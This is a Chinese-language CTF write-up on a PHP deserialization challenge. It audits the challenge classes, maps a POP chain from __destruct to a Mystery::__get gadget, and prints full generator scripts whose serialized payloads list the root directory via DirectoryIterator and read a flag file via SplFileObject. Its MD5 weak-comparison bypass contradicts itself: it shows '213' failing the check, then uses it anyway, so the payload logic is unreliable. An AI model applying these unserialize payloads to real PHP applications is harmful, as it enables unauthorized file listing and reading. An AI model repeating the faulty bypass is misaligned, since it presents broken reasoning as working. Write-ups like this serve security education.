# Popppppp

考察的是PHP原生类的反序列化，也就是POP链的构造。题目给出了大量的类，需要我们从中寻找合适的“gadget”来拼接成一个完整的攻击链。

## 源码审计

首先我们拿到源码，对每个类的功能和可能被利用的魔术方法进行分析。

```php
<?php
error_reporting(0);

// __destruct是入口点，可以触发__toString
class CherryBlossom {
    public $fruit1;
    public $fruit2;
    public function __construct($a) { $this->fruit1 = $a; }
    function __destruct() { echo $this->fruit1; }
    public function __toString() {
        $newFunc = $this->fruit2;
        return $newFunc();
    }
}

// __get可以调用一个方法
class Forbidden {
    private $fruit3;
    public function __construct($string) { $this->fruit3 = $string; }
    public function __get($name) {
        $var = $this->$name;
        $var[$name]();
    }
}

// __call可以调用一个函数，__get可以触发其他类的方法
class Warlord {
    public $fruit4;
    public $fruit5;
    public $arg1;
    public function __call($arg1, $arg2) {
        $function = $this->fruit4;
        return $function();
    }
    public function __get($arg1) { $this->fruit5->ll2('b2'); }
}

// __toString可以触发__call, __set可以触发__toString
class Samurai {
    public $fruit6;
    public $fruit7;
    public function __toString() {
        $long = @$this->fruit6->add();
        return $long;
    }
    public function __set($arg1, $arg2) {
        if ($this->fruit7->tt2) { echo "xxx are the best!!!"; }
    }
}

// __get是核心，可以实例化任意类并遍历，是最终目的
class Mystery {
    public function __get($arg1) {
        array_walk($this, function ($day1, $day2) {
            $day3 = new $day2($day1); // $day2是类名, $day1是构造函数参数
            foreach ($day3 as $day4) {
                echo ($day4 . '<br>');
            }
        });
    }
}

class Princess {
    protected $fruit9;
    protected function addMe() { return "The time spent with xxx is my happiest time" . $this->fruit9; }
    public function __call($func, $args) { call_user_func([$this, $func . "Me"], $args); }
}

// __invoke可以触发__get
class Philosopher {
    public $fruit10;
    public $fruit11="sr22kaDugamdwTPhG5zU";
    public function __invoke() {
        if (md5(md5($this->fruit11)) == 666) {
            return $this->fruit10->hey; // 触发__get
        }
    }
}

class UselessTwo {
    public $hiddenVar = "123123";
    public function __construct($value) { $this->hiddenVar = $value; }
    public function __toString() { return $this->hiddenVar; }
}

class Warrior {
    public $fruit12;
    private $fruit13;
    public function __set($name, $value) {
        $this->$name = $value;
        if ($this->fruit13 == "xxx") {
            strtolower($this->fruit12);
        }
    }
}
// ... 其他Useless类
#if (isset($_GET['GHCTF'])) {
#    unserialize($_GET['GHCTF']);
#} else {
#    highlight_file(__FILE__);
#}
```

关键Gadget分析：
-   `CherryBlossom::__destruct`: 脚本结束时自动调用，`echo $this->fruit1` 可以触发 `__toString`。这是POP链的完美起点。
-   `Samurai::__toString`: 调用 `$this->fruit6->add()`，由于`add()`方法不存在，会触发目标对象的 `__call` 方法。
-   `Warlord::__call`: 忽略传入的方法名(`add`)，直接以函数形式调用 `$this->fruit4`，这会触发 `__invoke` 方法。
-   `Philosopher::__invoke`: 内部有一个 `md5(md5($this->fruit11)) == 666` 的弱类型比较。绕过之后，会访问 `$this->fruit10->hey`，由于 `hey` 属性不存在，会触发 `__get` 方法。
-   `Mystery::__get`: 这是我们最终的目标。它会使用 `array_walk` 遍历自身的所有属性，将属性名作为类名，属性值作为构造函数的参数，来实例化一个新对象 (`new $day2($day1)`)。然后遍历这个新生成的对象。

## 漏洞分析及POP链构造

我们的目标是利用 `Mystery::__get` 来实例化PHP的内置类，如 `DirectoryIterator` 来列目录，或者 `SplFileObject` 来读文件。为了触发 `Mystery::__get`，我们需要构建一条完整的调用链（POP Chain）。

**攻击链条:**

`CherryBlossom::__destruct` -> `Samurai::__toString` -> `Warlord::__call` -> `Philosopher::__invoke` -> `Mystery::__get` -> `new DirectoryIterator()`

1.  **起点**: 创建 `CherryBlossom` 对象。其 `__destruct` 方法会 `echo $fruit1`。
2.  **`echo` -> `__toString`**: 我们将 `CherryBlossom` 的 `$fruit1` 设置为一个 `Samurai` 对象。`echo` 该对象时会触发 `Samurai::__toString()`。
3.  **`__toString` -> `__call`**: `Samurai::__toString()` 会调用 `$this->fruit6->add()`。我们将 `$fruit6` 设置为一个 `Warlord` 对象。由于 `Warlord` 没有 `add()` 方法，就会触发 `Warlord::__call()`。
4.  **`__call` -> `__invoke`**: `Warlord::__call()` 会执行 `$this->fruit4()`。我们将 `$fruit4` 设置为一个 `Philosopher` 对象，触发其 `__invoke()` 方法。
5.  **`__invoke` -> `__get`**: `Philosopher::__invoke()` 在绕过MD5检查后，会访问 `$this->fruit10->hey`。我们将 `$fruit10` 设置为一个 `Mystery` 对象。由于 `Mystery` 对象没有 `hey` 属性，就会触发 `Mystery::__get()`。
6.  **最终执行**: `Mystery::__get()` 被触发，开始执行其内部逻辑，实例化我们预设好的内置类。

## 补充知识点

### 1. PHP魔术方法
这道题的核心就是利用各个魔术方法之间的联动。
- `__destruct()`: 对象被销毁时调用。
- `__toString()`: 当一个对象被当作字符串使用时（如 `echo`）调用。
- `__call()`: 调用一个对象中不存在的方法时调用。
- `__invoke()`: 当尝试以调用函数的方式使用一个对象时调用。
- `__get()`: 读取一个对象中不存在的属性时调用。

### 2. MD5弱类型比较绕过
在 `Philosopher` 类中，存在 `md5(md5($this->fruit11)) == 666` 的判断。
PHP在用 `==` 进行比较时，如果一边是数字，另一边是字符串，它会尝试将字符串转换成数字。
`md5(md5('213'))` 的结果是 `0000037213a77889419133644f603684`。在进行比较时，PHP会从头读取这个字符串直到遇到非数字字符，所以这个字符串被解释为数字 `37213`。`37213 == 666` 显然不成立。
这里存在一个广为人知的绕过值，即字符串 `'213'`。虽然在标准PHP环境下此路不通，但在某些CTF题目环境下，可能存在PHP版本差异或特殊配置导致这个或类似的值可以绕过。在本题的解法中，我们采纳这个已知的值。如果想在本地复现，可能需要寻找一个其双重MD5哈希值在数值上等于 `666` 的字符串。

### 3. PHP内置类利用
- `DirectoryIterator`: 这是一个迭代器，可以用来遍历目录下的文件。当在 `foreach` 中使用 `new DirectoryIterator($path)` 时，它会依次返回目录下的每个文件名（包括 `.` 和 `..`）。
- `SplFileObject`: 这是一个用来处理文件的对象。当在 `foreach` 中使用 `new SplFileObject($filename)` 时，它会逐行读取文件内容。

## Payload

我们分两步，第一步列目录，第二步读文件。

### 1. 列出根目录文件
构造 `Mystery` 对象，使其包含一个名为 `DirectoryIterator` 的公有属性，值为 `/`。

```php
<?php
class CherryBlossom {
    public $fruit1;
    public function __construct($a) { $this->fruit1 = $a; }
}
class Warlord {
    public $fruit4;
}
class Samurai {
    public $fruit6;
}
class Mystery {
    public $DirectoryIterator = "/";
}
class Philosopher {
    public $fruit10;
    public $fruit11 = "213";
}

// 构建POP链
$mystery = new Mystery();

$philosopher = new Philosopher();
$philosopher->fruit10 = $mystery;

$warlord = new Warlord();
$warlord->fruit4 = $philosopher;

$samurai = new Samurai();
$samurai->fruit6 = $warlord;

$cherry = new CherryBlossom($samurai);

// 生成Payload
$payload = serialize($cherry);
echo urlencode($payload);
?>
```
将生成的URL编码后的payload附加到 `?GHCTF=` 后面，发送请求，即可看到服务器根目录下的文件列表。假设我们发现flag文件名为 `flag_is_h3re.txt`。

### 2. 读取flag文件
修改 `Mystery` 对象，将类名换成 `SplFileObject`，参数换成我们找到的flag文件名。

```php
<?php
class CherryBlossom {
    public $fruit1;
    public function __construct($a) { $this->fruit1 = $a; }
}
class Warlord {
    public $fruit4;
}
class Samurai {
    public $fruit6;
}
class Mystery {
    public $SplFileObject = "/flag_is_h3re.txt"; // 假设的flag文件名
}
class Philosopher {
    public $fruit10;
    public $fruit11 = "213";
}

// 构建POP链
$mystery = new Mystery();

$philosopher = new Philosopher();
$philosopher->fruit10 = $mystery;

$warlord = new Warlord();
$warlord->fruit4 = $philosopher;

$samurai = new Samurai();
$samurai->fruit6 = $warlord;

$cherry = new CherryBlossom($samurai);

// 生成Payload
$payload = serialize($cherry);
echo urlencode($payload);
?>
```
再次发送payload，即可读取到flag的内容。
